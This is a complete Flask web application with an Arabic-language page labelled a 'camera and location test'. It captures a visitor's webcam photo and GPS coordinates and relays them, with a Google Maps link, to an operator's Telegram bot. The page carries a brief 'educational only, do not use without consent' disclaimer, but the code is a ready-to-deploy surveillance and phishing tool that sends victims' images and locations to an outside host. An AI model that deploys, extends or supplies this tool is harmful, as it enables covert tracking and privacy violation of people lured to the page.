import base64
import requests
import os
from flask import Flask, request, render_template_string, abort

app = Flask(__name__)

# اقرأ التوكنات من Environment
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    print("⚠️ BOT_TOKEN أو CHAT_ID غير موجودين في Environment Variables!")
    abort(500, description="Missing Telegram credentials.")

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>تجربة الكاميرا والموقع</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding: 20px;
    }
    video, canvas {
      margin: 10px;
      border: 1px solid #ccc;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
    }
    #status {
      margin-top: 20px;
      color: green;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h2>تجربة الكاميرا والموقع</h2>
  <p style="color:red; font-weight:bold;">
  ⚠️ هذه مجرد تجربة تعليمية. لا تستخدم الكود ضد أي شخص بدون إذنه. قد تتعرض للمسؤولية القانونية.
  </p>
  <video id="video" width="320" height="240" autoplay></video><br/>
  <button id="snap">التقاط صورة وإرسال البيانات</button>
  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
  <p id="status"></p>

  <script>
    let latitude = null;
    let longitude = null;
    let imageData = null;

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        document.getElementById("video").srcObject = stream;
      })
      .catch(err => {
        document.getElementById("status").innerText = "لم يتم السماح بالكاميرا.";
      });

    navigator.geolocation.getCurrentPosition(
      position => {
        latitude = position.coords.latitude;
        longitude = position.coords.longitude;
      },
      error => {
        console.log("خطأ في جلب الموقع:", error);
      }
    );

    document.getElementById("snap").addEventListener("click", () => {
      const canvas = document.getElementById("canvas");
      const video = document.getElementById("video");
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      imageData = canvas.toDataURL("image/png");
      sendData();
    });

    function sendData() {
      fetch("/upload", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          image: imageData,
          latitude: latitude,
          longitude: longitude
        })
      })
      .then(response => response.text())
      .then(data => {
        document.getElementById("status").innerText = "✅ تم إرسال البيانات بنجاح!";
      })
      .catch(err => {
        document.getElementById("status").innerText = "حدث خطأ في الإرسال.";
      });
    }
  </script>
</body>
</html>
"""

@app.route("/", methods=["GET"])
def index():
    return render_template_string(HTML_PAGE)

@app.route("/upload", methods=["POST"])
def upload():
    data = request.json

    # تأكد إن البيانات موجودة
    if not data:
        return "No data provided", 400

    # معالجة الصورة إذا موجودة
    image_data = data.get("image")
    if image_data:
        try:
            base64_data = image_data.split(",")[1]
            filename = "captured_image.png"
            with open(filename, "wb") as f:
                f.write(base64.b64decode(base64_data))
            send_photo_to_telegram(filename)
            os.remove(filename)  # حذف الصورة بعد الإرسال
        except Exception as e:
            print(f"خطأ أثناء معالجة الصورة: {e}")

    # إرسال الموقع
    latitude = data.get("latitude")
    longitude = data.get("longitude")

    if latitude and longitude:
        text = f"📍 موقع المستخدم:\nLatitude: {latitude}\nLongitude: {longitude}\nGoogle Maps: https://www.google.com/maps?q={latitude},{longitude}"
        send_message_to_telegram(text)

    return "تم استلام البيانات"

def send_photo_to_telegram(filepath):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(filepath, "rb") as photo:
        files = {"photo": photo}
        data = {
            "chat_id": CHAT_ID,
            "caption": "📸 صورة ملتقطة من المستخدم (تجربة توعوية)"
        }
        response = requests.post(url, files=files, data=data)
        print("رد تيليجرام (صورة):", response.text)

def send_message_to_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    response = requests.post(url, data=data)
    print("رد تيليجرام (نص):", response.text)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
